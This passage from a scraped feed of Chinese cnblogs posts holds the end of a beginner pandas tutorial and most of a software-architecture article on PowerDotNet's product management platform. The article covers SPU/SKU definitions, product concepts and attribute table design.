查看筛选后的数据：年龄大于 25 的人\nprint(\"\\n--- 年龄 &gt; 25 的记录 ---\")\nprint(df[df['年龄'] &gt; 25])\n</code></pre>\n<p><a href=\"https://www.min2k.com/tools/python-run/?code=import%20pandas%20as%20pd%0D%0A%0D%0A%23%20%E5%87%86%E5%A4%87%E6%95%B0%E6%8D%AE%EF%BC%88%E7%B1%BB%E4%BC%BC%20Excel%20%E7%9A%84%E8%A1%8C%E4%B8%8E%E5%88%97%EF%BC%89%0D%0Adata%20%3D%20%7B%0D%0A%20%20%20%20'%E5%A7%93%E5%90%8D'%3A%20%5B'%E5%BC%A0%E4%B8%89'%2C%20'%E6%9D%8E%E5%9B%9B'%2C%20'%E7%8E%8B%E4%BA%94'%2C%20'%E8%B5%B5%E5%85%AD'%5D%2C%0D%0A%20%20%20%20'%E5%B9%B4%E9%BE%84'%3A%20%5B25%2C%2030%2C%2022%2C%2028%5D%2C%0D%0A%20%20%20%20'%E5%9F%8E%E5%B8%82'%3A%20%5B'%E5%8C%97%E4%BA%AC'%2C%20'%E4%B8%8A%E6%B5%B7'%2C%20'%E5%B9%BF%E5%B7%9E'%2C%20'%E6%B7%B1%E5%9C%B3'%5D%0D%0A%7D%0D%0A%0D%0A%23%20%E8%BD%AC%E6%8D%A2%E4%B8%BA%20DataFrame%0D%0Adf%20%3D%20pd.DataFrame%28data%29%0D%0A%0D%0A%23%20%E6%89%93%E5%8D%B0%E8%A1%A8%E6%A0%BC%0D%0Aprint%28%22---%20%E5%AE%8C%E6%95%B4%E8%A1%A8%E6%A0%BC%20---%22%29%0D%0Aprint%28df%29%0D%0A%0D%0A%23%20%E6%9F%A5%E7%9C%8B%E7%AD%9B%E9%80%89%E5%90%8E%E7%9A%84%E6%95%B0%E6%8D%AE%EF%BC%9A%E5%B9%B4%E9%BE%84%E5%A4%A7%E4%BA%8E%2025%20%E7%9A%84%E4%BA%BA%0D%0Aprint%28%22%5Cn---%20%E5%B9%B4%E9%BE%84%20%3E%2025%20%E7%9A%84%E8%AE%B0%E5%BD%95%20---%22%29%0D%0Aprint%28df%5Bdf%5B'%E5%B9%B4%E9%BE%84'%5D%20%3E%2025%5D%29\" rel=\"noopener nofollow\" target=\"_blank\">在线运行此示例</a>  ，结果如下：</p>\n<p><img alt=\"QQ截图20251231150536\" class=\"lazyload\" /></p>\n<ol start=\"2\">\n<li>数据统计与排序</li>\n</ol>\n<pre><code class=\"language-python\">import pandas as pd\n\n# 创建一个简单的成绩单\nscores = pd.DataFrame({\n    '科目': ['数学', '语文', '英语', '科学'],\n    '分数': [95, 88, 76, 92]\n})\n\n# 计算平均分\navg_score = scores['分数'].mean()\nprint(f\"平均分是: {avg_score}\")\n\n# 按分数从高到低排序\nsorted_scores = scores.sort_values(by='分数', ascending=False)\nprint(\"\\n--- 成绩排名 ---\")\nprint(sorted_scores)\n</code></pre>\n<p><a href=\"https://www.min2k.com/tools/python-run/?code=import%20pandas%20as%20pd%0D%0A%0D%0A%23%20%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E6%88%90%E7%BB%A9%E5%8D%95%0D%0Ascores%20%3D%20pd.DataFrame%28%7B%0D%0A%20%20%20%20'%E7%A7%91%E7%9B%AE'%3A%20%5B'%E6%95%B0%E5%AD%A6'%2C%20'%E8%AF%AD%E6%96%87'%2C%20'%E8%8B%B1%E8%AF%AD'%2C%20'%E7%A7%91%E5%AD%A6'%5D%2C%0D%0A%20%20%20%20'%E5%88%86%E6%95%B0'%3A%20%5B95%2C%2088%2C%2076%2C%2092%5D%0D%0A%7D%29%0D%0A%0D%0A%23%20%E8%AE%A1%E7%AE%97%E5%B9%B3%E5%9D%87%E5%88%86%0D%0Aavg_score%20%3D%20scores%5B'%E5%88%86%E6%95%B0'%5D.mean%28%29%0D%0Aprint%28f%22%E5%B9%B3%E5%9D%87%E5%88%86%E6%98%AF%3A%20%7Bavg_score%7D%22%29%0D%0A%0D%0A%23%20%E6%8C%89%E5%88%86%E6%95%B0%E4%BB%8E%E9%AB%98%E5%88%B0%E4%BD%8E%E6%8E%92%E5%BA%8F%0D%0Asorted_scores%20%3D%20scores.sort_values%28by%3D'%E5%88%86%E6%95%B0'%2C%20ascending%3DFalse%29%0D%0Aprint%28%22%5Cn---%20%E6%88%90%E7%BB%A9%E6%8E%92%E5%90%8D%20---%22%29%0D%0Aprint%28sorted_scores%29\" rel=\"noopener nofollow\" target=\"_blank\">在线运行此示例</a>，结果如下：</p>\n<p><img alt=\"QQ截图20251231150823\" class=\"lazyload\" /></p>\n<h1 id=\"附录pandas-学习资源\">附录：Pandas 学习资源</h1>\n<ol>\n<li>官方网站：<a href=\"https://pandas.pydata.org/\" rel=\"noopener nofollow\" target=\"_blank\">pandas.pydata.org</a></li>\n<li>中文文档：<a href=\"https://pandas.python64.cn\" rel=\"noopener nofollow\" target=\"_blank\">pandas.python64.cn</a></li>\n<li>中文自述：<a href=\"https://www.python64.cn/readme/pandas/\" rel=\"noopener nofollow\" target=\"_blank\">README</a></li>\n<li>在线运行：<a href=\"https://www.min2k.com/tools/python-run/\" rel=\"noopener nofollow\" target=\"_blank\">PythonRun</a></li>\n</ol>\n<blockquote>\n<p>如果这篇文章对你有帮助，欢迎点赞、收藏、转发！<br />\n学习过程中有任何问题，欢迎在评论区留言交流～</p>\n</blockquote>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2025-12-31 15:22</span>&nbsp;\n<a href=\"https://www.cnblogs.com/min2k\">敏编程</a>&nbsp;\n阅读(<span id=\"post_view_count\">151</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "PowerDotNet平台化软件架构设计与实现系列（18）：商品管理平台",
      "link": "https://www.cnblogs.com/jeffwongishandsome/p/goods-platform-design-and-implement.html",
      "published": "",
      "description": "<h1 class=\"postTitle\"><a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/jeffwongishandsome/p/goods-platform-design-and-implement.html\" id=\"cb_post_title_url\" title=\"发布于 2025-12-31 12:11\">\n    <span>PowerDotNet平台化软件架构设计与实现系列（18）：商品管理平台</span>\n    \n\n</a>\n</h1>\n\t<div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p>商品系统是电子商务的核心系统之一，是各种电商业务展开的基础和起点，没有调查就没有发言权，个人也深度参与设计开发和维护过商品系统，本文简单分享下PowerDotNet重写过的商品平台系统。</p>\n<p>十多年前我刚入行，首次接触电商业务系统开发，开发重点集中在财务、库管、订单等这些需要后台强力支持的系统，反而对商品有个刻板印象，就是觉得商品系统简单，字典型应用而已，难度不大。</p>\n<p>随着开发和填坑经验的累积以及业务知识面的扩大，从传统B2C到OTA到酒店到在线阅读再到生鲜电商，一路走来，当我真正独立设计实现过一次商品系统，才深刻意识到当初对商品的想法相当浅薄。</p>\n<p>商品作为电商业务基础主数据，在中小公司可以抽象到<a href=\"https://www.cnblogs.com/jeffwongishandsome/p/basedata-system-design-and-implement.html\" target=\"_blank\">基础数据平台</a>中管理，个人工作过的公司就有这样处理的，不过大中型公司通常都会独立开发商品管理系统(CMS)，充分说明商品管理的重要性。</p>\n<p>PowerDotNet的商品平台Power.Commodity目前已经重写完成，有时写的很挣扎，这可能和个人追求完美要从良好到更好再到更加好的自我要求有关，更可能是间隔过长看不懂自己的祖传代码，^_-。</p>\n<p>想起代码大全里的话，大意是需求和设计文档都可能过时，而源代码往往是对软件的唯一精准描述，很多项目，程序员可以唯一得到的文档就是源代码本身。深度分析过祖传代码就能理解这话真是至理。</p>\n<p>在实现商品系统的过程中，我也跟风热血沸腾激情澎湃用上了如日中天的AI工具，比如Cursor、Copilot、通义千问和DeepSeek等，人工智能果然厉害，因为我真有一堆祖传商品代码需要和AI交叉验证。</p>\n<p>没有代码支撑的系统设计无异于镜花水月空中楼阁，可行性、可用性和稳定性都很可疑，Power.Commodity则建立在我个人实际工作过的商品系统代码基础之上，至少设计和实现都经受过生产环境考验。</p>\n<p>商品系统建模相对还是比较简单的，但面对复杂的业务场景，为了满足业务需要不得不做出设计上的妥协，这种其实就是个性化需求，个人经历过的很多个性化商品需求在Power.Commodity都没有实现。</p>\n<p>相对于传统的商品，个人也先后参与过服务商品、虚拟商品、汽车商品和生鲜商品的设计开发和维护工作，这四类商品有其不言而喻的特殊性和复杂度，一言以蔽之，通用性不足，本文只做一些概要说明。</p>\n<p>本文介绍的商品只是个人经验中最经典和传统的商品模型，特殊商品我热血沸腾激情澎湃写了几周都不太满意就撤销了很多代码，工作量实在巨大，尽管如此，依然符合我们先写出来再说出来的务实风格。</p>\n<p><strong>环境准备</strong></p>\n<p>1、（必须）.Net Framework4.5+</p>\n<p>2、（必须）关系型数据库MySQL或SqlServer或PostgreSQL或MariaDB四选一</p>\n<p>3、（必须）PowerDotNet<a href=\"https://www.cnblogs.com/jeffwongishandsome/p/db-system-design-and-implement.html\" target=\"_blank\">数据库管理平台</a></p>\n<p>4、（必须）PowerDotNet配置中心<a href=\"https://www.cnblogs.com/jeffwongishandsome/p/app-system-design-and-implement.html\" target=\"_blank\">Power.ConfigCenter</a></p>\n<p>5、（必须）PowerDotNet注册中心<a href=\"https://www.cnblogs.com/jeffwongishandsome/p/service-governance-design-and-implement.html\" target=\"_blank\">Power.RegistryCenter</a></p>\n<p>6、（必须）PowerDotNet缓存平台<a href=\"https://www.cnblogs.com/jeffwongishandsome/p/cache-platform-design-and-implement.html\" target=\"_blank\">Power.Cache</a></p>\n<p>7、（必须）PowerDotNet消息平台<a href=\"https://www.cnblogs.com/jeffwongishandsome/p/messaging-queue-platform-design-and-implement.html\" target=\"_blank\">Power.Message</a></p>\n<p>8、（必须）PowerDotNet文件平台<a href=\"https://www.cnblogs.com/jeffwongishandsome/p/file-platform-design-and-implement.html\" target=\"_blank\">Power.File</a></p>\n<p>9、（必须）PowerDotNet人员管理平台<a href=\"https://www.cnblogs.com/jeffwongishandsome/p/human-crm-design-and-implement.html\" target=\"_blank\">Power.HCRM</a></p>\n<p>10、（必须）PowerDotNet基础数据平台<a href=\"https://www.cnblogs.com/jeffwongishandsome/p/basedata-system-design-and-implement.html\" target=\"_blank\">Power.BaseData</a></p>\n<h3>一、名词术语</h3>\n<p>商品可以认为是影响传统电商业务全局的基础数据，在供应链、仓库、门店、订单、支付、财务、结算、配送等业务端被广泛使用，对电商业务正常运营流转有举足轻重的作用。</p>\n<p>所有的辩论，都是定义之争。作为给电商中的商品、渠道商品和货品都写过代码的资深开发，个人很熟悉不良商品设计给仓端、配端和财务等系统造成的问题，觉得有必要再明确商品的定义。</p>\n<p>商品特别基础，但有些公司直到倒闭了，对商品概念还含糊不清，别问我怎么知道的，我就是知道，咩哈哈。本着发现问题，定义问题，解决问题的原则，本文争取把商品管理写个清楚明白。</p>\n<p>职业生涯至今，有了些业务和技术积累，但在商品管理里经常碰到误把冯京作马凉的情况，反而是看上去盘根错节枝繁叶茂的支付、财务和CRM等系统处理起来更加得心应手融会贯通。</p>\n<p>虽然个人有多年的电商开发经验，自认为也非常了解商品系统，什么产品、商品、货品、原料、辅料、SPU、SKU、渠道商品、属性、规格、参数、标签、包装方案、BOM等等都耳熟能详。</p>\n<p>可是真要严格说出个所以然来，有些定义写出来真不那么让人信服，本文还是先对照着搜索引擎摘录一下，防止系统都做出来了，对基本概念还稀里糊涂的，让人觉得可靠性堪忧，咩哈哈。</p>\n<h4>1、商品</h4>\n<p>马克思主义政治经济学认为：人类劳动是最可贵的，它可以创造价值。这就是马克思主义在经济学里最出名的一个理论，即劳动价值论。</p>\n<p>根据这个基础的理论，马克思给商品的定义是“商品是用来交换的劳动产品”。</p>\n<p>一个物品要想成为商品必须满足两个条件：</p>\n<p>（1）、它必须是劳动产品</p>\n<p>一个物品要想成为商品它就必须是人类劳动的结晶，劳动创造价值，所有的商品都应该是人们劳动生产出来的，也就是说必须凝结了一定的人类劳动。</p>\n<p>（2）、它必须是用于交换的</p>\n<p>假如一件物品其本身只是凝结了人类劳动，但本身并没有用于交换，而只是用于自己消费，这种物品就算不上是商品，因为商品最大的外在表现形式在于交换。</p>\n<p><strong>商品的二重性</strong></p>\n<p>商品二重性是指商品具有使用价值和价值两重属性。商品是用来交换的劳动产品，具有使用价值和价值两种属性，商品是使用价值和价值的统一。</p>\n<p>商品的有用性，即能够用来满足人们某种需要的属性，就是商品的使用价值。</p>\n<p>凝结在商品中的一般人类劳动就是商品的价值，各种商品的价值，只有量的差别，而无质的不同。</p>\n<p>价值存在于商品体内，是商品的社会属性，体现着商品生产者相互交换劳动的社会关系。</p>\n<p>（1）、使用价值</p>\n<p>商品要能够交换就必须有用，使用价值是物品能够满足人们某种需要的属性，它是商品的自然属性，是构成社会财富的物质内容，是人类社会赖以生存和发展的物质基础。它体现了人与自然的关系。使用价值本身并不是政治经济学的研究对象。马克思政治经济学之所以要考察使用价值，是因为商品的使用价值是其交换价值的物质承担者。一种物品要成为商品，仅有使用价值是不够的，它还必须是用来交换的，即具有交换价值。商品除具有使用价值外，还具有交换价值。交换价值是一种使用价值同另一种使用价值相交换的量的关系或比例。</p>\n<p>（2）、价值</p>\n<p>价值是凝结在商品中的无差别的一般人类劳动，它是商品的社会属性，也是商品所特有的属性，体现了商品生产者相互比较和交换劳动的经济关系。马克思主义揭示了劳动是价值的源泉。价值是一个历史的范畴。作为商品的二因素之一，价值是商品最本质的因素。</p>\n<p>（3）使用价值和价值的关系</p>\n<p>价值是使用价值的基础，使用价值是价值的表现形式。&nbsp;</p>\n<p>商品是使用价值和价值的矛盾统一体，使用价值和价值之间存在着对立统一的辩证关系。</p>\n<p>首先，使用价值与价值是统一的。二者共处于一个统一体中，缺一就不成其为商品。价值的存在要以使用价值的存在为前提，没有使用价值的东西也就不会有价值；使用价值是价值的物质承担者，价值寓于使用价值之中。</p>\n<p>其次，使用价值与价值又是不同的、矛盾的。</p>\n<p>因为：第一，对同一商品生产者或消费者来说，同一商品的使用价值和价值不可兼得。商品生产者向消费者让渡使用价值以换取价值，消费者为得到使用价值而支付价值。</p>\n<p>第二，使用价值是商品的自然属性，体现人与自然的关系；而价值是商品的社会属性，体现商品生产者之间的经济关系。 使用价值是一切有用物品包括商品所共有的属性，是永恒的范畴；价值是商品所特有的属性，是商品经济的范畴，因而是历史的范畴。</p>\n<p>商品之所以具有使用价值和价值两个因素，是由于生产商品的劳动具有二重性。劳动二重性决定商品二因素，具体劳动创造使用价值，抽象劳动形成价值。 劳动二重性是商品二重性的根源。</p>\n<h4>2、SPU和SKU</h4>\n<p>（1）、SPU</p>\n<p>SPU = Standard Product Unit （标准化产品单元）</p>\n<p>SPU是商品信息聚合的最小单位，是一组可复用、易检索的标准化信息的集合，该集合描述了一个产品的特性。</p>\n<p>（2）、SKU</p>\n<p>SKU = Stock Keeping Unit(库存量单位)</p>\n<p>SKU即库存进出计量的单位（买家购买、商家进货、供应商备货、工厂生产等都是依据SKU进行的），SKU是物理上不可分割的最小存货单元，也就是说一款商品，可以根据SKU来确定具体的货物存量。</p>\n<p>（3）、异同</p>\n<p>SPU和SKU都是一组属性名值对的大集合，一组相似SKU抽象出的公共集合的统称可以认为就是SPU，下面以一个通俗易懂的示例来直观理解SPU和SKU。</p>\n<p>华为P50 Pro手机是一种SPU；生产于中国大陆基于鸿蒙操作系统于2021年上市的黑色机身内存128GB运行内存8GB...的华为P50 Pro手机是一个SKU。</p>\n<p>可以看到一种商品SPU包含多种SKU，SPU（SKU1、SKU2……SKU n），且SKU唯一，具有详细属性规格参数的SPU就可以唯一定义一个SKU。</p>\n<p>因为规格（属性或参数）的不同，SKU容易产生组合爆炸难题。以华为P50 Pro为例，关键规格有颜色（黑色、白色、银色、金色）、机身内存（128G、256G、512G），可以组合出4x3=12个SKU。</p>\n<p>从市场交易的角度来说，SPU是一种抽象集合，是无形的，无法直接定价，虽然直观理解是有价值和使用价值的，但没有价格，不能被交易；而SKU有价值和使用价值，也有价格，可以进行买卖。</p>\n<p>通常我们口头上所说的商品，其实可以直观理解为SKU。当然我们口头上说买了一部华为P50 Pro手机是不严谨的，应该说买了一部黑色机身内存128GB运行内存8GB...（其他属性）的华为P50 Pro手机。</p>\n<p>特别提醒，商品、SKU和SPU是完全不同的三个独立概念，SPU到SKU再到商品，是从抽象逐步到具体的过程，商品模型决定了基本定义能否被严格区分，但现实开发中常有人把它们混用而不自知。</p>\n<h4>3、产品</h4>\n<p>产品是指被人们使用和消费，并能满足人们某种需求的任何东西，包括有形的物品、无形的服务、组织、观念或它们的组合。</p>\n<p>在经济领域中，通常也可理解为组织制造的任何制品或制品的组合。在现代汉语词典当中的解释为“生产出来的物品”。</p>\n<p>网上有很多文章将SPU说成是产品或者等价于产品，个人认为是不太严谨的，但是绝大多数电子商务环境下这么理解也是可以接受的。</p>\n<p>产品一般可以分为五个层次，即核心产品、基本产品、期望产品、附加产品、潜在产品。</p>\n<p>（1）、核心产品是指整体产品提供给购买者的直接利益和效用；</p>\n<p>（2）、基本产品是指核心产品的宏观化；</p>\n<p>（3）、期望产品是指顾客在购买产品时，一般会期望得到的一组特性或条件；</p>\n<p>（4）、附加产品是指超过顾客期望的产品；</p>\n<p>（5）、潜在产品是指产品或开发物在未来可能产生的改进和变革。</p>\n<p>简单来说就是“为了满足市场需要，而创建的用于运营的功能及服务”就是产品。</p>\n<p>在交换的时空场景、过程中，产品可以被称为商品，也就是说产品和商品是可以互相转换的。</p>\n<p>产品和商品的主要区别：产品不论是交换前与交换后都可称为产品。而当一种产品经过买卖交换进入使用过程后，如果不存在交换场景中就不能再称之为商品，只能称为产品。当这个产品又在交换的场景中的时候，那么在这段即将发生买卖交换的时间空间内，它又能被称之为商品。商品是用于买卖交换前的产品，产品经过买卖交换进入使用阶段后就不能称为商品了，只能称为产品。</p>\n<h4>4、货品</h4>\n<p><a href=\"https://baike.baidu.com/item/%E8%B4%A7%E5%93%81/4181397\" rel=\"noopener nofollow\" target=\"_blank\">货品</a>，汉语词语，读音是huò pǐn，意思是货物；也指货物的品种。</p>\n<p>百度百科里的这个2025年之前的（旧）解释真是坑爹，简直就和没解释一样。我们再来看看几个流行AI工具对货品的定义是什么样的。</p>\n<p>（1）、<a href=\"https://tongyi.aliyun.com/qianwen/\" rel=\"noopener nofollow\" target=\"_blank\">通义千问</a></p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/32361/202501/32361-20250120194050109-691265243.png\" /></p>\n<p>（2）、字节<a href=\"https://www.doubao.com/chat/\" rel=\"noopener nofollow\" target=\"_blank\">豆包</a></p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/32361/202501/32361-20250120194109127-1087604747.png\" /></p>\n<p>（3）、<a href=\"https://www.deepseek.com/\" rel=\"noopener nofollow\" target=\"_blank\">DeepSeek</a></p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/32361/202501/32361-20250120194143085-651858788.png\" /></p>\n<p>（4）、<a href=\"https://yiyan.baidu.com/\" rel=\"noopener nofollow\" target=\"_blank\">文心一言</a></p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/32361/202501/32361-20250120194159306-1190941789.png\" /></p>\n<p>（5）、<a href=\"https://hunyuan.tencent.com/\" rel=\"noopener nofollow\" target=\"_blank\">腾讯混元</a></p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/32361/202501/32361-20250120194219993-1097272774.png\" /></p>\n<p>（6）、<a href=\"https://kimi.moonshot.cn/\" rel=\"noopener nofollow\" target=\"_blank\">Kimi</a></p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/32361/202501/32361-20250120203106556-1605965651.png\" /></p>\n<p>根据AI工具给出的解释，我们能够得到如下结论：</p>\n<p>（1）、商品，更强调经济属性，是指为交换而生产的劳动产品，具有价值和使用价值。商品的核心在于“交换”。</p>\n<p>（2）、货品，更强调物理属性，是指具体的物品或货物，通常指库存、仓储或运输中的物品。货品的核心在于“物品本身”。</p>\n<p>个人认为货品这个名词本身就是很抽象的定义，对抽象本身再进行抽象，实现的结果就可能挺抽象的。</p>\n<p>曾经某电商公司以货品来重写商品系统，从设计之初到上线再到日常运营甚至公司关门大吉前都问题不断，尤其是货品表的一把梭设计，一张表一百几十个字段，让人大开眼界，咩哈哈。</p>\n<p>货品看上去是一种合理的抽象定义，但实践证明不宜用于商品系统设计，遗憾的是个人投入再多精力也无济于事。抽象和设计糟糕造成业务系统写不好，不比刻骨铭心爱而不得好受多少。</p>\n<h4>5、原料</h4>\n<p>用于进一步加工的材料即为原料，可以是其它加工过程的产物，也可以是自然界生长或自然形成的产物。</p>\n<p>原料可以进行采购，可以交换和买卖，其价格往往是标准价格或按质论价，典型示例如铁矿石等。</p>\n<p>原料在采购和买卖的过程中，有使用价值和价值，有价格，这样就自动转换为了商品。</p>\n<h4>6、辅料</h4>\n<p>对产品生产起辅助作用的材料。示例：服装的辅料，有拉链，纽扣，兜标等附属物；生鲜类产品的辅料有塑料箱、胶带等。</p>\n<p>辅料也可以进行采购，可以交换和买卖，在采购和买卖的过程中，有使用价值和价值，有价格，这样就自动转换为了商品。</p>\n<h4>7、BOM</h4>\n<p>BOM = Bill of Material，叫做物料清单，也叫产品结构表、物料表等。</p>\n<p>将产品的原材料、零配件、组合件予以拆解，并将各单项物料按物料代码、品名、规格、单位用量、损耗等依制造流程的顺序记录下来，排列为一个清单，这就是物料清单，也就是BOM。</p>\n<p>BOM是：</p>\n<p>(1) 、物资需求计划（Material Requirement Planning，MRP）的基础。</p>\n<p>(2) 、制造令发料的计算依据。</p>\n<p>(3) 、本质上是一项工程文件，不但是产品的规范说明，而且是制造流程的依据。</p>\n<p>(4) 、用来核算产品成本的基础。</p>\n<p>由以上知道BOM的重要性及其影响范围很大，故其内容必须随时保持正确及时。&nbsp;</p>\n<h4>8、渠道商品</h4>\n<p>发布到某个销售渠道的商品集合，例如线下实体店、线上商城、自助售货机、无人售货商店等渠道。渠道商品在业务系统处理过程中往往会增加很多额外工作量以适配不同渠道。</p>\n<p>渠道商品的架构设计和实现非常考验开发者的水平和经验，设计不好，除了增加工作量和系统复杂度，每次看到和维护不可描述的业务代码更是让人头疼，这也是个人经验之谈。</p>\n<h4>9、商品规格</h4>\n<p>商品规格（Goods specifications），是指一些足以反映商品品质的主要指标，如化学成分、含量、纯度、性能、容量、长短、粗细等。</p>\n<p>例如：买衣服的商品规格指的是尺寸的大小，一般的均码分大、中、小号；有的较细，上衣依据衣长、胸围、领长分大小，下裤依据裤长短、腰围分大小等等。</p>\n<h4>10、商品属性</h4>\n<p>商品属性，平常也叫商品参数，是指商品本身所固有的性质，是商品在不同领域差异性（不同于其他商品的性质）的集合。也就是说，商品属性是商品性质的集合，是商品差异性的集合。</p>\n<p>简单来说，商品属性是描述商品维度的字段，也就是商品的基本信息。</p>\n<p>属性或参数或规格，它们其实非常相似，当然商品属性、商品参数、商品规格的严格定义和区分一直有争议，本文不做过多讨论。</p>\n<h3>二、商品基础</h3>\n<p>任何系统都会或多或少用到些字典型的基础数据，商品系统当然也不例外。商品基础数据管理是主数据管理中非常重要的环节，在电商活动中商品基础数据出现频率极高。</p>\n<p>本文简单介绍几种最常见的查询检索用到的基础数据，包括品牌、分类、厂商等。</p>\n<h4>1、品牌</h4>\n<p>各种各样电子商务活动中出现频率最高的词汇之一就是品牌。</p>\n<p><img alt=\"\" src=\"https://img2023.cnblogs.com/blog/32361/202212/32361-20221206132301842-1534048670.png\" /></p>\n<h4>2、厂商</h4>\n<p>商品的厂商和品牌息息相关。</p>\n<p>品牌和厂商通过关系表进行连接查询，品牌和厂商通常是一对一或一对多的关系。</p>\n<p><img alt=\"\" src=\"https://img2023.cnblogs.com/blog/32361/202212/32361-20221206133412481-1600579638.png\" /></p>\n<h4>3、分类</h4>\n<p>商品分类是商品分组聚合最常用到的技术和业务手段，分类通常支持层级管理，最多二到三级为宜，很多电商公司分类层级都最多精确到三级分类。</p>\n<p>PowerDotNet实现的商品平台目前支持通用的三级商品分类，满足绝大多数电商业务需求，复杂度可控，可扩展性也适中。</p>\n<p><img alt=\"\" src=\"https://img2023.cnblogs.com/blog/32361/202212/32361-20221206133145322-1984363967.png\" /></p>\n<h4>4、分类分组</h4>\n<p>商品分类自身也支持分组管理，比如商品分类可以分为前台分类、后台分类、营销分类、手机分类等等，按照业务需要进行扩展。</p>\n<p>当然商品分类分组不是必须，如果分类设计的好，可扩展性优秀，完全可以适配多种场景，不需要再独立进行分组管理。</p>\n<h4>5、其他</h4>\n<p>其他如商品标签、单位、产地、价保等基础数据本文不再列出。</p>\n<p>有些电商公司还会把尺码、颜色等抽象出来放在基础数据表里，PowerDotNet实现的商品平台没有采用这种做法。</p>\n<h3>三、SPU管理</h3>\n<p>SPU的抽象能够大大简化商品管理。让我们再来复习一遍SPU的定义。</p>\n<p>SPU = Standard Product Unit （标准化产品单元），SPU是商品信息聚合的最小单位，是一组可复用、易检索的标准化信息的集合，该集合描述了一个产品的特性。</p>\n<h4>1、SPU档案</h4>\n<p>SPU包含的标准化的信息主要包括品牌、分类、厂商、区域、助记码等公共信息，个性化的信息不适合抽象到SPU中，可以在商品属性中独立添加或修改。</p>\n<p>SPU抽象的粒度非常考验业务或运营人员的经验和需求，缺少经验的业务运营人员经常会需要不断变更SPU的定义。</p>\n<p>比如，华为P40 Pro和华为P50 Pro可以定义成两个SPU，也可以直接定义成华为手机Pn系列一个SPU，这个就看实际运营需求，通常情况下SPU管理宜细不宜粗，越具体越好。</p>\n<p>SPU的管理对商品系统的稳定非常重要，如果系统里SPU需要经常变动，我们很可能需要重新抽象定义新的SPU。</p>\n<p><img alt=\"\" src=\"https://img2023.cnblogs.com/blog/32361/202212/32361-20221206165019077-1805649348.png\" /></p>\n<p>SPU字段较多，新增SPU比较考验业务和运营人员的耐心，当然对于相似的SPU，商品平台提供了快速复制生成SPU的工具，几个必填参数改改或者留空后台自动生成，很容易就能添加一个SPU。</p>\n<p><img alt=\"\" src=\"https://img2023.cnblogs.com/blog/32361/202212/32361-20221208180545691-164593647.png\" /></p>\n<h4>2、审核SPU</h4>\n<p>SPU的管理对商品系统的稳定是如此重要，所以SPU所有新增或修改操作都需要人员审核，所有关于SPU的操作都要添加审计日志，特定环境或场景下可以依赖日志快速恢复或还原。</p>\n<h4>3、生成商品</h4>\n<p>SPU不是商品，但是可以通过SPU工具自动批量快速生成最终售卖的商品，有差异性的商品属性单独修改即可，这样就可以大大简化商品的添加操作。</p>\n<p><img alt=\"\" src=\"https://img2023.cnblogs.com/blog/32361/202212/32361-20221208180045247-2005847316.png\" /></p>\n<h3>四、属性管理</h3>\n<p>商品属性是对我们通常所说的商品规格、商品属性和商品参数的通用抽象。</p>\n<p>PowerDotNet重写的商品平台，对规格、属性和参数经过慎重考虑后进行了裁剪和取舍，直接按照商品属性来定义商品元数据，不延用规格而使用属性仅仅是因为作者的个人喜好，咩哈哈。</p>\n<p>商品属性的表设计采用了经典的元数据设计大法，按照属性名和属性值进行独立建表，可扩展性非常好，虽然查询检索可能会比较复杂，但是有成熟的技术手段如Lucene、ES等全文检索技术优化查询。</p>\n<p>属性名值对支持文本、单选和多选设计，这种设计方法对于电商系统中常见的单规格商品和多规格商品可以完美支持。</p>\n<p>有了元数据设计法，品牌、分类等商品基础属性通过名值对字典表也能完美适配，但很多电商都独立设计这几张数据表，一个原因是查询频繁，另一个可能是品牌有图片，分类有前台、APP显示名称等，业务字段较多。</p>\n<h4>1、属性名</h4>\n<p>属性名支持分组管理，这个抽象通常都是后台管理用到，前端逻辑不需要过分关注。</p>\n<p><img alt=\"\" src=\"https://img2023.cnblogs.com/blog/32361/202212/32361-20221206141604963-2124763475.png\" /></p>\n<p>属性名也支持层级管理，通常不那么复杂的电商场景，只设计一级属性名即可。</p>\n<p><img alt=\"\" src=\"https://img2023.cnblogs.com/blog/32361/202212/32361-20221206135652018-632561398.png\" /></p>\n<h4>&nbsp;2、属性值</h4>\n<p>根据属性名定义不同的属性值，对于单规格商品就设置一个值，多规格商品就设置多个属性值。</p>\n<p><img alt=\"\" src=\"https://img2023.cnblogs.com/blog/32361/202212/32361-20221206141318522-2051644006.png\" /></p>\n<h4>&nbsp;3、商品属性</h4>\n<p>属性名和属性值定义好了，最终是要作用于商品上的，否则单独设计属性名和属性值也没有意义。</p>\n<p>商品、属性名和属性值可以通过传统的中间关系表产生关联，这样可以达到属性名值对作用于商品上的效果。</p>\n<p><img alt=\"\" src=\"https://img2023.cnblogs.com/blog/32361/202212/32361-20221207090434834-2105754989.png\" 